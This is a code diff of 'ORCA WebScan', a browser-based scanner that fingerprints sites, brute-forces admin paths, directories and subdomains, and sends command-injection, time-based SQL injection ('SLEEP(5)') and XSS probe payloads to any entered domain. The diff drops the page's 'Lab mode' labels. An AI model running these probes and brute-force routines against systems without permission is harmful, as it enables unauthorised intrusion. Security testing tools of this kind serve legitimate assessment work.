@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ORCA WebScan (Lab)</title>
+<title>ORCA WebScan</title>
 <style>
 :root{
   --navy:#0b1d3a;
@@ -157,10 +157,10 @@ pre{
 <body>
 
 <div class="container">
-  <h1>ORCA WebScan (Lab)</h1>
+  <h1>ORCA WebScan</h1>
 
   <div class="card">
-    <p class="small">⚠️ Only scan targets you own or have explicit permission to test. This is LAB mode.</p>
+    <p class="small">⚠️ Only scan targets you own or have explicit permission to test.</p>
 
     <div class="row">
       <input id="target" placeholder="domain.com" autofocus>
@@ -177,7 +177,7 @@ pre{
     </div>
 
     <div class="section" style="margin-top:16px;">
-      <h2>Lab Mode: Verify Exploit (Payload Testing)</h2>
+      <h2>Verify Exploit (Payload Testing)</h2>
 
       <label>Endpoint (relative or absolute):</label>
       <input id="labEndpoint" placeholder="/vulnerable?cmd=">
@@ -269,21 +269,13 @@ const headersCheck=[
 ];
 
 let lastReport = null;
-
 let bruteState = {
-  admin: {running:false, index:0, list:[], found:[], delay:150},
-  sub: {running:false, index:0, list:[], found:[], delay:150},
+  admin: {running:false, index:0, list:[], found:[], delay:200},
+  sub: {running:false, index:0, list:[], found:[], delay:200},
   dir: {running:false, index:0, list:[], found:[], delay:200}
 };
 
-function pauseBrute(type){ bruteState[type].running=false; }
-function resumeBrute(type){
-  bruteState[type].running=true;
-  if(type==="admin") adminBrute(true);
-  if(type==="sub") subdomainBrute(true);
-  if(type==="dir") dirBrute(true);
-}
-
+/* ----------------- HELPERS ----------------- */
 function clean(d){ return d.trim().replace(/^https?:\/\//,'').replace(/\/+$/,''); }
 function setProgress(p){ document.getElementById("bar").style.width = p + "%"; }
 function badge(txt,cls){ return `<span class="badge ${cls}">${txt}</span>`; }
@@ -295,12 +287,23 @@ async function timeoutFetch(url,ms=8000){
   return fetch(url,{signal:c.signal});
 }
 
+function buildUrl(domain, ep, payload, method){
+  const base = PROXY + "http://" + domain;
+  if(method === "GET"){
+    const separator = ep.includes("?") ? "&" : "?";
+    return base + ep + separator + encodeURIComponent(payload);
+  }
+  return base + ep;
+}
+
+/* ----------------- THEME ----------------- */
 function toggleTheme(){
   const root = document.documentElement;
   const t = root.getAttribute("data-theme");
   root.setAttribute("data-theme", t==="dark" ? "light" : "dark");
 }
 
+/* ----------------- STORAGE ----------------- */
 function saveHistory(report){
   const h = JSON.parse(localStorage.getItem("orca_history")||"[]");
   h.unshift({time:new Date().toISOString(), report});
@@ -322,13 +325,18 @@ function clearHistory(){
   renderHistory();
 }
 
+/* ----------------- SCAN FUNCTIONS ----------------- */
 async function scanHTTP(domain){
   const r=await timeoutFetch(PROXY+"http://"+domain);
   const text=await r.text();
+
+  let headersObj = {};
+  r.headers.forEach((v,k)=> headersObj[k]=v);
+
   return {
     status:r.status,
     url:r.url,
-    headers:r.headers,
+    headers:headersObj,
     body:text,
     https:r.url.startsWith("https")
   };
@@ -337,7 +345,7 @@ async function scanHTTP(domain){
 function techFingerprint(http){
   const tech=[];
   const body=http.body||"";
-  const server=http.headers.get("server")||"";
+  const server=http.headers["server"]||"";
 
   const patterns = [
     ["WordPress", /wp-content|wp-includes/i],
@@ -364,7 +372,7 @@ function techFingerprint(http){
 }
 
 function scanHeaders(h){
-  return headersCheck.map(x=>({name:x,ok:h.has(x)}));
+  return headersCheck.map(x=>({name:x,ok:!!h[x]}));
 }
 
 async function scanDNS(domain){
@@ -383,12 +391,14 @@ async function scanDNS(domain){
 async function subdomains(domain){
   let list=[];
 
+  // CRT.SH
   try{
     const r=await fetch(`https://crt.sh/?q=%25.${domain}&output=json`);
     const j=await r.json();
-    list = [...new Set(j.map(x=>x.name_value))];
+    list = [...new Set(j.map(x=>x.name_value))].slice(0,30);
   }catch{}
 
+  // DNS A fallback
   try{
     const r=await fetch(`https://dns.google/resolve?name=${domain}&type=A`);
     const j=await r.json();
@@ -414,7 +424,7 @@ async function scanPorts(domain){
 
 function detectWAF(headers, body){
   const waf=[];
-  const h=k=>(headers.get(k)||"").toLowerCase();
+  const h=k=> (headers[k]||"").toLowerCase();
   const b=(body||"").toLowerCase();
 
   if(h("server").includes("cloudflare")||h("cf-ray")) waf.push("Cloudflare");
@@ -435,13 +445,13 @@ function xssIndicators(http){
   const h=http.headers;
   const body=http.body||"";
 
-  if(!h.has("content-security-policy"))
+  if(!h["content-security-policy"])
     issues.push("Missing CSP");
   if(/<script[\s>]/i.test(body))
     issues.push("Inline <script> present");
   if(/innerHTML\s*=|document\.write|eval\(/i.test(body))
     issues.push("DOM XSS sink pattern");
-  if(!h.has("x-xss-protection"))
+  if(!h["x-xss-protection"])
     issues.push("X-XSS-Protection missing (legacy)");
 
   return issues;
@@ -586,6 +596,7 @@ function risk(r){
   return {score:s,level:s<20?"Low":s<40?"Medium":"High"};
 }
 
+/* ----------------- RUN ----------------- */
 async function run(){
   const out=document.getElementById("output");
   const det=document.getElementById("details");
@@ -672,11 +683,11 @@ async function run(){
   `;
 }
 
+/* ----------------- ENTER FIX ----------------- */
 document.addEventListener("DOMContentLoaded", () => {
   const target = document.getElementById("target");
   target.focus();
 
-  // ENTER = Scan
   target.addEventListener("keydown", function(e){
     if(e.key === "Enter"){
       e.preventDefault();
@@ -684,7 +695,6 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // CTRL+ENTER = Lab Run
   document.getElementById("labPayload").addEventListener("keydown", function(e){
     if(e.key === "Enter" && e.ctrlKey){
       e.preventDefault();
@@ -695,6 +705,7 @@ document.addEventListener("DOMContentLoaded", () => {
   renderHistory();
 });
 
+/* ----------------- EXPORT ----------------- */
 function exportReport(){
   if(!lastReport){
     alert("No report to export yet.");
@@ -710,10 +721,6 @@ function exportReport(){
 }
 
 /* ----------------- LAB ----------------- */
-function escapeOutput(text){
-  return text.replace(/</g,"&lt;").replace(/>/g,"&gt;");
-}
-
 async function labTest(){
   const domain=clean(document.getElementById("target").value);
   if(!domain){
@@ -730,23 +737,17 @@ async function labTest(){
     return;
   }
 
-  const url = PROXY + "http://" + domain + ep + (method==="GET" ? encodeURIComponent(payload) : "");
-  let res, text;
+  const url = buildUrl(domain, ep, payload, method);
 
   try{
-    if(method==="GET"){
-      res = await timeoutFetch(url, 8000);
-      text = await res.text();
-    } else {
-      res = await timeoutFetch(PROXY + "http://" + domain + ep, 8000);
-      text = await res.text();
-    }
+    let res = await timeoutFetch(url, 8000);
+    let text = await res.text();
 
     document.getElementById("labOut").textContent = `
 Status: ${res.status}
 URL: ${res.url}
 Response snippet:
-${escapeOutput(text.slice(0, 500))}
+${text.slice(0, 500)}
     `.trim();
 
   }catch(e){
@@ -772,24 +773,18 @@ async function validateRCE(){
   const token = uniqueToken();
   const payload = `echo ${token}`;
 
-  const url = PROXY + "http://" + domain + ep + (method==="GET" ? encodeURIComponent(payload) : "");
+  const url = buildUrl(domain, ep, payload, method);
 
   try{
-    let res, text;
-    if(method==="GET"){
-      res = await timeoutFetch(url, 8000);
-      text = await res.text();
-    } else {
-      res = await timeoutFetch(PROXY + "http://" + domain + ep, 8000);
-      text = await res.text();
-    }
+    let res = await timeoutFetch(url, 8000);
+    let text = await res.text();
 
     const ok = text.includes(token);
     document.getElementById("labOut").textContent = `
 VALIDATION RESULT: ${ok ? "VALID (RCE confirmed)" : "NOT VALID (no output)"}
 Token: ${token}
 Response snippet:
-${escapeOutput(text.slice(0, 500))}
+${text.slice(0, 500)}
     `.trim();
 
   }catch(e){
@@ -807,7 +802,7 @@ async function validateSQLiTimeBased(){
   }
 
   const payload = "' OR SLEEP(5) -- ";
-  const url = PROXY + "http://" + domain + ep + encodeURIComponent(payload);
+  const url = buildUrl(domain, ep, payload, "GET");
 
   const start = performance.now();
   try{
@@ -833,7 +828,7 @@ async function validateXSSReflected(){
   }
 
   const payload = "<svg/onload=alert(1)>";
-  const url = PROXY + "http://" + domain + ep + encodeURIComponent(payload);
+  const url = buildUrl(domain, ep, payload, "GET");
 
   try{
     const res = await timeoutFetch(url, 8000);
@@ -841,7 +836,7 @@ async function validateXSSReflected(){
     const reflected = text.includes(payload);
 
     document.getElementById("labOut").textContent =
-      `Reflected XSS Test:\nStatus: ${res.status}\nReflected: ${reflected ? "YES" : "NO"}\nResponse snippet:\n${escapeOutput(text.slice(0,200))}`;
+      `Reflected XSS Test:\nStatus: ${res.status}\nReflected: ${reflected ? "YES" : "NO"}\nResponse snippet:\n${text.slice(0,200)}`;
   }catch(e){
     document.getElementById("labOut").textContent="timeout/CORS/proxy";
   }
@@ -859,14 +854,14 @@ async function validateXSSStored(){
   const url = PROXY + "http://" + domain + ep;
 
   try{
-    const res = await timeoutFetch(url, 8000, {
-      method:"POST",
-      headers:{ "Content-Type":"application/x-www-form-urlencoded" },
-      body:"input="+encodeURIComponent(token)
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "input=" + encodeURIComponent(token)
     });
     const text = await res.text();
     document.getElementById("labOut").textContent =
-      `Stored XSS Test (POST):\nStatus: ${res.status}\nPayload sent.\nResponse snippet:\n${escapeOutput(text.slice(0,200))}\n\nNOTE: Stored XSS requires checking later if payload appears in another page.`;
+      `Stored XSS Test (POST):\nStatus: ${res.status}\nPayload sent.\nResponse snippet:\n${text.slice(0,200)}\n\nNOTE: Stored XSS requires checking later if payload appears in another page.`;
   }catch(e){
     document.getElementById("labOut").textContent="timeout/CORS/proxy";
   }
@@ -1091,12 +1086,6 @@ async function adminBrute(resume=false){
 
 /* ----------------- CSRF TOKEN CHECKER ----------------- */
 function csrfChecker(){
-  const domain = clean(document.getElementById("target").value);
-  if(!domain){
-    document.getElementById("adminOut").textContent="Target required.";
-    return;
-  }
-
   const body = lastReport?.http?.body || "";
   const forms = [...body.matchAll(/<form[\s\S]*?<\/form>/gi)];
   if(!forms.length){
@@ -1193,6 +1182,17 @@ async function wpPluginThemeDetect(){
   }catch(e){
     document.getElementById("subOut").textContent="Failed (CORS/proxy/timeout)";
   }
+}
+
+/* ----------------- PAUSE/RESUME CONTROLS ----------------- */
+function pauseBrute(type){
+  bruteState[type].running=false;
+}
+function resumeBrute(type){
+  bruteState[type].running=true;
+  if(type==="admin") adminBrute(true);
+  if(type==="sub") subdomainBrute(true);
+  if(type==="dir") dirBrute(true);
 }
 </script>
 </body>
